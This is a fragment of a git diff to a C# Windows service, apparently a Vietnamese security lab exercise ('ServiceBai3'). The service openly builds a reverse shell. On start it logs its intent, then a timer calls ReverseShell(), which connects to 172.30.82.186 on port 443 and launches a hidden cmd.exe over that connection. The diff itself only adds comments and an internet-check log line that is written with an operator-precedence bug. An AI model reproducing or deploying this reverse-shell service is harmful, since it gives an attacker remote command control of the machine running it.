@@ -25,7 +25,8 @@ namespace ServiceBai3
             InitializeComponent();
         }
         protected override void OnStart(string[] args)
-        {            
+        {
+            WriteToFile("Internet connection: " + CheckForInternetConnection() ? "OK" : "Failed");
             WriteToFile("Create a reverse shell server after 5s, please wait....");
             timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
             timer.Interval = 5000;
@@ -35,7 +36,7 @@ namespace ServiceBai3
 
         private static void ReverseShell()
         {
-            using (TcpClient client = new TcpClient("172.30.82.186", 443))
+            using (TcpClient client = new TcpClient("172.30.82.186", 443)) // tạo kết nối TCP tới máy chủ
             {
                 using (Stream stream = client.GetStream())
                 {
@@ -45,7 +46,7 @@ namespace ServiceBai3
 
                         StringBuilder strInput = new StringBuilder();
 
-                        Process p = new Process();
+                        Process p = new Process(); // start cmd
                         p.StartInfo.FileName = "cmd.exe";
                         p.StartInfo.CreateNoWindow = true;
                         p.StartInfo.UseShellExecute = false;
